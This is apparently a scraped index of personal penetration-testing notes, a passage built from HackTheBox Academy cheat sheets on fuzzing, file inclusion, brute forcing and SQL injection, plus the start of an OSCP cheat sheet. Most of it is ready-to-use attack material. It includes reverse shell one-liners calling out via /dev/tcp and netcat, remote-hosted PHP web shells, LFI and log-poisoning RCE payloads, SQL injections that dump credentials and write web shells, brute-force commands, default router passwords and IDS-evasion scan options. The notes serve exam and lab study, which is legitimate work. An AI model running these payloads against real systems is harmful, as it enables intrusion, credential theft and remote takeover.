Parameter Fuzzing - GET <code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Parameter Fuzzing - POST <code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Value Fuzzing"},{"location":"HackTheBox%20Materials/Attacking%20Web%20Applications%20with%20FFUF/#wordlists","title":"Wordlists","text":"Command Description <code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code> Directory/Page Wordlist <code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code> Extensions Wordlist <code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code> Domain Wordlist <code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code> Parameters Wordlist"},{"location":"HackTheBox%20Materials/Attacking%20Web%20Applications%20with%20FFUF/#misc","title":"Misc","text":"Command Description <code>sudo sh -c 'echo \"SERVER_IP  academy.htb\" &gt;&gt; /etc/hosts'</code> Add DNS entry <code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code> Create Sequence Wordlist <code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> curl w/ POST"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/","title":"File Inclusion/Path Traversal","text":""},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#local-file-inclusion","title":"Local File Inclusion","text":"Command Description Basic LFI <code>/index.php?language=/etc/passwd</code> Basic LFI <code>/index.php?language=../../../../etc/passwd</code> LFI with path traversal <code>/index.php?language=/../../../etc/passwd</code> LFI with name prefix <code>/index.php?language=./languages/../../../../etc/passwd</code> LFI with approved path LFI Bypasses <code>/index.php?language=....//....//....//....//etc/passwd</code> Bypass basic path traversal filter <code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> Bypass filters with URL encoding <code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code> Bypass appended extension with path truncation (obsolete) <code>/index.php?language=../../../../etc/passwd%00</code> Bypass appended extension with null byte (obsolete) <code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code> Read PHP with base64 filter"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#remote-code-execution","title":"Remote Code Execution","text":"Command Description PHP Wrappers <code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code> RCE with data wrapper <code>curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id\"</code> RCE with input wrapper <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id\"</code> RCE with expect wrapper RFI <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code> Host web shell <code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code> Include remote PHP web shell LFI + Upload <code>echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif</code> Create malicious image <code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code> RCE with malicious uploaded image <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code> Create malicious zip archive 'as jpg' <code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code> RCE with malicious uploaded zip <code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code> Create malicious phar 'as jpg' <code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code> RCE with malicious uploaded phar Log Poisoning <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code> Read PHP session parameters <code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code> Poison PHP session with web shell <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code> RCE through poisoned PHP session <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php\" -A '&lt;?php system($_GET[\"cmd\"]); ?&gt;'</code> Poison server log <code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code> RCE through poisoned PHP session"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#misc","title":"Misc","text":"Command Description <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code> Fuzz page parameters <code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code> Fuzz LFI payloads <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code> Fuzz webroot path <code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code> Fuzz server configurations LFI Wordlists LFI-Jhaddix.txt Webroot path wordlist for Linux Webroot path wordlist for Windows Server configurations wordlist for Linux Server configurations wordlist for Windows"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#file-inclusion-functions","title":"File Inclusion Functions","text":"Function Read Content Execute Remote URL PHP <code>include()</code>/<code>include_once()</code> \u2705 \u2705 \u2705 <code>require()</code>/<code>require_once()</code> \u2705 \u2705 \u274c <code>file_get_contents()</code> \u2705 \u274c \u2705 <code>fopen()</code>/<code>file()</code> \u2705 \u274c \u274c NodeJS <code>fs.readFile()</code> \u2705 \u274c \u274c <code>fs.sendFile()</code> \u2705 \u274c \u274c <code>res.render()</code> \u2705 \u2705 \u274c Java <code>include</code> \u2705 \u274c \u274c <code>import</code> \u2705 \u2705 \u2705 .NET <code>@Html.Partial()</code> \u2705 \u274c \u274c <code>@Html.RemotePartial()</code> \u2705 \u274c \u2705 <code>Response.WriteFile()</code> \u2705 \u274c \u274c <code>include</code> \u2705 \u2705 \u2705"},{"location":"HackTheBox%20Materials/Getting%20Started%20-%20General/","title":"Getting Started - General","text":""},{"location":"HackTheBox%20Materials/Getting%20Started%20-%20General/#basic-tools","title":"Basic Tools","text":"Command Description General <code>sudo openvpn user.ovpn</code> Connect to VPN <code>ifconfig</code>/<code>ip a</code> Show our IP address <code>netstat -rn</code> Show networks accessible via the VPN <code>ssh user@10.10.10.10</code> SSH to a remote server <code>ftp 10.129.42.253</code> FTP to a remote server tmux <code>tmux</code> Start tmux <code>ctrl+b</code> tmux: default prefix <code>prefix c</code> tmux: new window <code>prefix 1</code> tmux: switch to window (<code>1</code>) <code>prefix shift+%</code> tmux: split pane vertically <code>prefix shift+\"</code> tmux: split pane horizontally <code>prefix -&gt;</code> tmux: switch to the right pane Vim <code>vim file</code> vim: open <code>file</code> with vim <code>esc+i</code> vim: enter <code>insert</code> mode <code>esc</code> vim: back to <code>normal</code> mode <code>x</code> vim: Cut character <code>dw</code> vim: Cut word <code>dd</code> vim: Cut full line <code>yw</code> vim: Copy word <code>yy</code> vim: Copy full line <code>p</code> vim: Paste <code>:1</code> vim: Go to line number 1. <code>:w</code> vim: Write the file 'i.e. save' <code>:q</code> vim: Quit <code>:q!</code> vim: Quit without saving <code>:wq</code> vim: Write and quit"},{"location":"HackTheBox%20Materials/Getting%20Started%20-%20General/#pentesting","title":"Pentesting","text":"Command Description Service Scanning <code>nmap 10.129.42.253</code> Run nmap on an IP <code>nmap -sV -sC -p- 10.129.42.253</code> Run an nmap script scan on an IP <code>locate scripts/citrix</code> List various available nmap scripts <code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code> Run an nmap script on an IP <code>netcat 10.10.10.10 22</code> Grab banner of an open port <code>smbclient -N -L \\\\\\\\10.129.42.253</code> List SMB Shares <code>smbclient \\\\\\\\10.129.42.253\\\\users</code> Connect to an SMB share <code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code> Scan SNMP on an IP <code>onesixtyone -c dict.txt 10.129.42.254</code> Brute force SNMP secret string Web Enumeration <code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code> Run a directory scan on a website <code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code> Run a sub-domain scan on a website <code>curl -IL https://www.inlanefreight.com</code> Grab website banner <code>whatweb 10.10.10.121</code> List details about the webserver/certificates <code>curl 10.10.10.121/robots.txt</code> List potential directories in <code>robots.txt</code> <code>ctrl+U</code> View page source (in Firefox) Public Exploits <code>searchsploit openssh 7.2</code> Search for public exploits for a web application <code>msfconsole</code> MSF: Start the Metasploit Framework <code>search exploit eternalblue</code> MSF: Search for public exploits in MSF <code>use exploit/windows/smb/ms17_010_psexec</code> MSF: Start using an MSF module <code>show options</code> MSF: Show required options for an MSF module <code>set RHOSTS 10.10.10.40</code> MSF: Set a value for an MSF module option <code>check</code> MSF: Test if the target server is vulnerable <code>exploit</code> MSF: Run the exploit on the target server is vulnerable Using Shells <code>nc -lvnp 1234</code> Start a <code>nc</code> listener on a local port <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code> Send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2&gt;&amp;1\\|nc 10.10.10.10 1234 &gt;/tmp/f</code> Another command to send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2&gt;&amp;1\\|nc -lvp 1234 &gt;/tmp/f</code> Start a bind shell on the remote server <code>nc 10.10.10.1 1234</code> Connect to a bind shell started on the remote server <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1) <code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice Upgrade shell TTY (2) <code>echo \"&lt;?php system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php</code> Create a webshell php file <code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code> Execute a command on an uploaded webshell Privilege Escalation <code>./linpeas.sh</code> Run <code>linpeas</code> script to enumerate remote server <code>sudo -l</code> List available <code>sudo</code> privileges <code>sudo -u user /bin/echo Hello World!</code> Run a command with <code>sudo</code> <code>sudo su -</code> Switch to root user (if we have access to <code>sudo su</code>) <code>sudo su user -</code> Switch to a user (if we have access to <code>sudo su</code>) <code>ssh-keygen -f key</code> Create a new SSH key <code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys</code> Add the generated public key to the user <code>ssh root@10.10.10.10 -i key</code> SSH to the server with the generated private key Transferring Files <code>python3 -m http.server 8000</code> Start a local webserver <code>wget http://10.10.14.1:8000/linpeas.sh</code> Download a file on the remote server from our local machine <code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code> Download a file on the remote server from our local machine <code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> Transfer a file to the remote server with <code>scp</code> (requires SSH access) <code>base64 shell -w 0</code> Convert a file to <code>base64</code> <code>echo f0VMR...SNIO...InmDwU \\| base64 -d &gt; shell</code> Convert a file from <code>base64</code> back to its orig <code>md5sum shell</code> Check the file's <code>md5sum</code> to ensure it converted correctly"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/","title":"Login Brute Forcing Cheat Sheet","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#what-is-brute-forcing","title":"What is Brute Forcing?","text":"<p>A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.</p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#factors-influencing-brute-force-attacks","title":"Factors Influencing Brute Force Attacks","text":"<ul> <li>Complexity of the password or key</li> <li>Computational power available to the attacker</li> <li>Security measures in place</li> </ul>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#how-brute-forcing-works","title":"How Brute Forcing Works","text":"<ol> <li>Start: The attacker initiates the brute force process.</li> <li>Generate Possible Combination: The software generates a potential password or key combination.</li> <li>Apply Combination: The generated combination is attempted against the target system.</li> <li>Check if Successful: The system evaluates the attempted combination.</li> <li>Access Granted (if successful): The attacker gains unauthorized access.</li> <li>End (if unsuccessful): The process repeats until the correct combination is found or the attacker gives up.</li> </ol>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#types-of-brute-forcing","title":"Types of Brute Forcing","text":"Attack Type Description Best Used When Simple Brute Force Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols). When there is no prior information about the password. Dictionary Attack Uses a pre-compiled list of common passwords. When the password is likely weak or follows common patterns. Hybrid Attack Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words. When the target uses slightly modified versions of common passwords. Credential Stuffing Uses leaked credentials from other breaches to access different services where users may have reused passwords. When you have a set of leaked credentials, and the target may reuse passwords. Password Spraying Attempts common passwords across many accounts to avoid detection. When account lockout policies are in place. Rainbow Table Attack Uses precomputed tables of password hashes to reverse them into plaintext passwords. When a large number of password hashes need cracking, and storage for tables is available. Reverse Brute Force Targets a known password against multiple usernames. When there\u2019s a suspicion of password reuse across multiple accounts. Distributed Brute Force Distributes brute force attempts across multiple machines to speed up the process. When the password is highly complex, and a single machine isn't powerful enough."},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#default-credentials","title":"Default Credentials","text":"Device Username Password Linksys Router admin admin Netgear Router admin password TP-Link Router admin admin Cisco Router cisco cisco Ubiquiti UniFi AP ubnt ubnt"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#brute-forcing-tools","title":"Brute-Forcing Tools","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#hydra","title":"Hydra","text":"<ul> <li>Fast network login cracker</li> <li>Supports numerous protocols</li> <li>Uses parallel connections for speed</li> <li>Flexible and adaptable</li> <li>Relatively easy to use</li> </ul> <p>Example Usage: <pre><code>hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#hydra-examples","title":"Hydra Examples","text":"Service/Protocol Description Example Command FTP Used to brute-force login credentials for FTP services. <code>hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100</code> SSH Targets SSH services to brute-force credentials. <code>hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100</code> HTTP GET/POST Used to brute-force web login forms using GET/POST requests. <code>hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect\"</code>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#medusa","title":"Medusa","text":"<ul> <li>Fast, massively parallel, modular login brute-forcer</li> <li>Supports a wide array of services</li> </ul> <p>Example Usage: <pre><code>medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#medusa-examples","title":"Medusa Examples","text":"Service/Protocol Description Example Command SSH Brute force SSH login for the admin user. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh</code> FTP Brute force FTP with multiple usernames and passwords. <code>medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5</code> RDP Brute force RDP login. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp</code> HTTP Basic Auth Brute force HTTP Basic Authentication. <code>medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET</code>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#custom-wordlists","title":"Custom Wordlists","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#username-anarchy","title":"Username Anarchy","text":"<p>Generates potential usernames based on a target's name.</p> <p>Example Commands: <pre><code>username-anarchy \"Jane Smith\"  # Generate usernames for \"Jane Smith\"\nusername-anarchy -i names.txt  # Use a file (names.txt) for input\nusername-anarchy -a --country us  # Generate usernames using US dataset\nusername-anarchy -@ example.com  # Append @example.com as a suffix\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#cupp-common-user-passwords-profiler","title":"CUPP (Common User Passwords Profiler)","text":"<p>Creates personalized password wordlists based on gathered intelligence.</p> <p>Example Commands: <pre><code>cupp -i  # Generate wordlist interactively\ncupp -w profiles.txt  # Generate a wordlist from a predefined profile file\ncupp -l  # Download popular password lists like rockyou.txt\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#password-policy-filtering","title":"Password Policy Filtering","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#common-grep-patterns-for-filtering-wordlists","title":"Common <code>grep</code> Patterns for Filtering Wordlists","text":"Policy Requirement <code>grep</code> Regex Pattern Explanation Minimum Length (8 chars) <code>grep -E '^.{8,}$' wordlist.txt</code> Ensures at least 8 characters per line. At Least One Uppercase Letter <code>grep -E '[A-Z]' wordlist.txt</code> Matches any uppercase letter. At Least One Lowercase Letter <code>grep -E '[a-z]' wordlist.txt</code> Matches any lowercase letter. At Least One Digit <code>grep -E '[0-9]' wordlist.txt</code> Matches any numeric digit. At Least One Special Character <code>grep -E '[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]' wordlist.txt</code> Matches any special character. No Consecutive Repeated Characters <code>grep -E '(.)\u0001' wordlist.txt</code> Detects repeated characters. Use <code>grep -v</code> to exclude matches. Exclude \"password\" <code>grep -v -i 'password' wordlist.txt</code> Case-insensitive exclusion of the word \"password\". Exclude Dictionary Words <code>grep -v -f dictionary.txt wordlist.txt</code> Removes common dictionary words from the list."},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/","title":"SQL Injection","text":""},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/#mysql","title":"MySQL","text":"Command Description General <code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code> login to mysql database <code>SHOW DATABASES</code> List available databases <code>USE users</code> Switch to database Tables <code>CREATE TABLE logins (id INT, ...)</code> Add a new table <code>SHOW TABLES</code> List available tables in current database <code>DESCRIBE logins</code> Show table properties and columns <code>INSERT INTO table_name VALUES (value_1,..)</code> Add values to table <code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code> Add values to specific columns in a table <code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code> Update table values Columns <code>SELECT * FROM table_name</code> Show all columns in a table <code>SELECT column1, column2 FROM table_name</code> Show specific columns in a table <code>DROP TABLE logins</code> Delete a table <code>ALTER TABLE logins ADD newColumn INT</code> Add new column <code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code> Rename column <code>ALTER TABLE logins MODIFY oldColumn DATE</code> Change column datatype <code>ALTER TABLE logins DROP oldColumn</code> Delete column Output <code>SELECT * FROM logins ORDER BY column_1</code> Sort by column <code>SELECT * FROM logins ORDER BY column_1 DESC</code> Sort by column in descending order <code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code> Sort by two-columns <code>SELECT * FROM logins LIMIT 2</code> Only show first two results <code>SELECT * FROM logins LIMIT 1, 2</code> Only show first two results starting from index 2 <code>SELECT * FROM table_name WHERE &lt;condition&gt;</code> List results that meet a condition <code>SELECT * FROM logins WHERE username LIKE 'admin%'</code> List results where the name is similar to a given string"},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/#mysql-operator-precedence","title":"MySQL Operator Precedence","text":"<ul> <li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li> <li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li> <li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li> <li>NOT (<code>!</code>)</li> <li>AND (<code>&amp;&amp;</code>)</li> <li>OR (<code>||</code>)</li> </ul>"},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/#sql-injection_1","title":"SQL Injection","text":"Payload Description Auth Bypass <code>admin' or '1'='1</code> Basic Auth Bypass <code>admin')-- -</code> Basic Auth Bypass With comments Auth Bypass Payloads Union Injection <code>' order by 1-- -</code> Detect number of columns using <code>order by</code> <code>cn' UNION select 1,2,3-- -</code> Detect number of columns using Union injection <code>cn' UNION select 1,@@version,3,4-- -</code> Basic Union injection <code>UNION select username, 2, 3, 4 from passwords-- -</code> Union injection for 4 columns DB Enumeration <code>SELECT @@version</code> Fingerprint MySQL with query output <code>SELECT SLEEP(5)</code> Fingerprint MySQL with no output <code>cn' UNION select 1,database(),2,3-- -</code> Current database name <code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code> List all databases <code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code> List all tables in a specific database <code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code> List all columns in a specific table <code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code> Dump data from a table in another database Privileges <code>cn' UNION SELECT 1, user(), 3, 4-- -</code> Find current user <code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -</code> Find if user has admin privileges <code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=\"root\"-- -</code> Find if all user privileges <code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -</code> Find which directories can be accessed through MySQL File Injection <code>cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- -</code> Read local file <code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code> Write a string to a local file <code>cn' union select \"\",'&lt;?php system($_REQUEST[0]); ?&gt;', \"\", \"\" into outfile '/var/www/html/shell.php'-- -</code> Write a web shell into the base web directory"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/","title":"OSCP CheatSheet","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#information-gathering","title":"Information gathering","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#passive-information-gathering","title":"Passive Information Gathering","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#passive-enumeration","title":"Passive Enumeration","text":"<p>Whois</p> <pre><code>whois domain.com\nwhois &lt;IP&gt;       # Reverse lookup\n</code></pre> <p>theHarvester</p> <pre><code>theHarvester -d  domain.com -l 100 -b google\n</code></pre> <p>Google Dork</p> <pre><code>site:[website] filetype:[filetype]\nsite:[website] -filetype:[filetype]\ncache:[URL]\nintitle:\"index of\" \"parent directory\"\nintext:\"domain.com\" \"passwords\"\n</code></pre> <p>Open-Source Code</p> <p>Github Search - owner:domain</p> <p>Gitleaks</p> <p>Tools :</p> <ul> <li>Shodan</li> <li>Exploits Shodan</li> <li>Maltego</li> <li>DNSdumpster</li> <li>Netcraft</li> <li>SecurityHeaders</li> <li>SSLTest</li> <li>GoogleDork</li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#llm-powered-passive-information-gathering","title":"LLM-Powered Passive Information Gathering","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#passive-llm-aided-enumeration","title":"Passive LLM-Aided enumeration","text":"<p>prompts:</p> <ul> <li><code>whois megacorpone.com</code></li> <li><code>Can you print out all the public information about company structure and employees of megacorpone?</code></li> <li><code>can you provide the best 20 google dorks for megacorpone.com website tailored for a penetration test?</code></li> <li><code>Retrieve the technology stack of the megacorpone.com website</code></li> <li><code>\u2026</code></li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-information-gathering","title":"Active Information Gathering","text":"<p>Living off the Land pre installed and trusted Windows binaries.  </p> <p>LOLBAS</p> <p>Each domain can use different types of DNS records. Some of the most common types of DNS records include:</p> <ul> <li>NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.</li> <li>A: Also known as a host record, the \"a record\" contains the IPv4 address of a hostname (such as www.megacorpone.com).</li> <li>AAAA: Also known as a quad A host record, the \"aaaa record\" contains the IPv6 address of a hostname (such as www.megacorpone.com).</li> <li>MX: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.</li> <li>PTR: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.</li> <li> <p>CNAME: Canonical Name Records are used to create aliases for other host records.</p> </li> <li> <p>TXT: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.</p> </li> </ul> <p>Host / Dig</p> <pre><code>host [domain]\nhost -t NS [domain]\nhost -t MX [domain]\nhost -t TXT [domain]\nhost -t PTR [IP]\n\nfor ip in $(cat list.txt); do host $ip.domain.com; done\nfor ip in $(seq 200 254); do host 10.10.10.$ip; done | grep -v \"not found\"\n\n---------------------------------------------------------------------------------\n\ndig any [domain]\ndig any [domain] @[DNSIP]\n</code></pre> <p>DNS Enumeration Tools</p> <ul> <li>Dnsrecon<ul> <li><code>dnsrecon -d [domain] -n [DNS IP]</code></li> <li><code>dnsrecon -d [domain] -n [DNS IP] -t std</code></li> <li><code>dnsrecon -d [domain] -D ~/list.txt -t brt</code></li> </ul> </li> <li>Dnsenum<ul> <li><code>dnsenum [domain]</code></li> <li><code>dnsenum [domain] --dnsserver [DNS IP]</code></li> <li><code>dnsrecon -d [domain] -D ~/list.txt -t brt</code></li> </ul> </li> <li>Fierce<ul> <li><code>fierce --domain [domain]</code></li> <li><code>fierce --domain [domain] --dns-servers [DNS IP]</code></li> <li><code>fierce --domain [domain] --dns-servers {IP}</code></li> </ul> </li> <li>NSLookup - \u201cLiving off the Land\u201d<ul> <li><code>nslookup [domain]</code></li> <li><code>nslookup -type=[type] [domain]</code></li> <li><code>nslookup -type=any [domain] [DNS IP]</code></li> </ul> </li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#port-scanning-with-nmap","title":"Port Scanning with Nmap","text":"<p>Host Discovery:</p> <ul> <li><code>nmap -sn [netblock]</code></li> <li><code>fping -asgq [netblock]</code></li> </ul> <p>Scanning techniques:</p> <pre><code>nmap -sS target                         # SYN/Stealth scan\nnmap -sA target                         # ACK scan\nnmap -sF target                         # FIN scan\nnmap -sN target                         # Null scan\nnmap -sO target                         # IP Protocol scan\nnmap -sX target                         # XMAS scan\n</code></pre> <p>Idle/Zombie scan:</p> <ul> <li><code>nmap -O -v -n [targetZombie]</code></li> <li><code>nmap --script ipidsec [targetZombie]</code></li> <li><code>nmap -Pn -sI [targetZombie]:[port] [target] -p [port] -v</code></li> </ul> <p>FTP bounce scan :</p> <ul> <li><code>nmap -Pn -b [vulnerableFTP] [target]</code></li> </ul> <p>Service and OS detection:</p> <pre><code>nc [targetIP]:[Port]                      # Banner Grabbing\nnmap -sV target                           # Version Scan\nnmap -sV -sC target                       # Version/Script Scan\nnmap -O target                            # OS Detection\nnmap -A target                            # Version/Script/OS/Traceroute Scan\n</code></pre> <p>Firewall/IDS Evasion:</p> <ul> <li>Fragmentation<ul> <li><code>nmap -sS -f [target]</code></li> <li><code>nmap -sS -f --data-lenght 100 [target]</code></li> </ul> </li> <li>Decoy<ul> <li><code>nmap -sS -D [spoofIP],[spoofIP],ME,[spoofIP] [target]</code></li> <li><code>nmap -sS -D RND:10 [target]</code></li> </ul> </li> <li>Source ports<ul> <li><code>nmap -sS --source-port [source port] [target]</code></li> </ul> </li> <li>Packet Header<ul> <li><code>nmap -sS --data-lenght 10 [target]</code></li> </ul> </li> <li>Mac address spoofing<ul> <li><code>nmap -sS --spoof-mac [mac] [target]</code></li> </ul> </li> <li>Timing<ul> <li><code>nmap -iL [hosts.txt] -sS -T [Timing option]</code></li> </ul> </li> </ul> <p>Living Off the Land </p> <pre><code>Test-NetConnection -Port [port] [IP]\n\n1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"[IP]\", $_)) \"TCP port $_ is open\"} 2&gt;$null\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#smb-enumeration","title":"SMB Enumeration","text":"<p>NetBIOS Enumeration:</p> <ul> <li>Windows<ul> <li><code>nbtstat -n</code></li> <li><code>nbtstat -A &lt;IP&gt;</code></li> </ul> </li> <li>Linux<ul> <li><code>nbtscan -v &lt;IP/NETBLOCK&gt;</code></li> </ul> </li> </ul> <p>SMB Shared Folder Enumeration</p> <ul> <li>Windows<ul> <li><code>net view \\\\dc01 /all</code></li> <li><code>net use K: \\\\dc01\\share</code></li> </ul> </li> <li>Linux<ul> <li><code>smbclient -N -L &lt;IP&gt;</code></li> <li><code>impacket-smbcliet &lt;IP&gt;</code></li> </ul> </li> </ul> <p>Nmap SMB Scripts - 